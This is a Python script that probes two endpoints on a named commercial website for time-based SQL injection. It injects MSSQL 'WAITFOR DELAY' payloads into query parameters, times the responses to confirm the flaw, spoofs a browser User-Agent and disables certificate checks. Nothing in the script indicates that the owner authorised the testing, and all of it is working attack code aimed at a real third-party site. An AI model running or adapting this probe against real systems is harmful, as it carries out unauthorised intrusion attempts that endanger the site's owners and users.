import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Accept": "*/*"
}

def verify_sqli(url_base, param):
    print(f"[*] Verifying SQLi on {url_base}?{param}=...")
    
    # 1. Baseline
    try:
        start = time.time()
        requests.get(f"{url_base}?{param}=1", headers=HEADERS, verify=False, timeout=10)
        baseline_time = time.time() - start
        print(f"  [+] Baseline request took: {baseline_time:.2f}s")
    except Exception as e:
        print(f"  [-] Baseline failed: {e}")
        return

    # 2. 5-Second Delay
    try:
        payload5 = "1'; WAITFOR DELAY '0:0:5'--"
        start = time.time()
        requests.get(f"{url_base}?{param}={requests.utils.quote(payload5)}", headers=HEADERS, verify=False, timeout=15)
        delay5_time = time.time() - start
        print(f"  [+] 5s delay payload took: {delay5_time:.2f}s")
    except Exception as e:
        print(f"  [-] 5s payload failed: {e}")
        return

    # 3. 3-Second Delay
    try:
        payload3 = "1'; WAITFOR DELAY '0:0:3'--"
        start = time.time()
        requests.get(f"{url_base}?{param}={requests.utils.quote(payload3)}", headers=HEADERS, verify=False, timeout=15)
        delay3_time = time.time() - start
        print(f"  [+] 3s delay payload took: {delay3_time:.2f}s")
    except Exception as e:
        print(f"  [-] 3s payload failed: {e}")
        return

    if delay5_time >= 5 and delay3_time >= 3 and baseline_time < 2:
        print("  [!!!] 100% CONFIRMED VULNERABLE: Time-based SQL Injection.")
    else:
        print("  [-] FALSE POSITIVE: The delays do not match the injected WAITFOR times. Likely network latency or WAF rate-limiting.")

if __name__ == "__main__":
    verify_sqli("https://fareharbor.com/hr.asp", "id")
    print("-" * 40)
    verify_sqli("https://fareharbor.com/chkrequest.asp", "user")
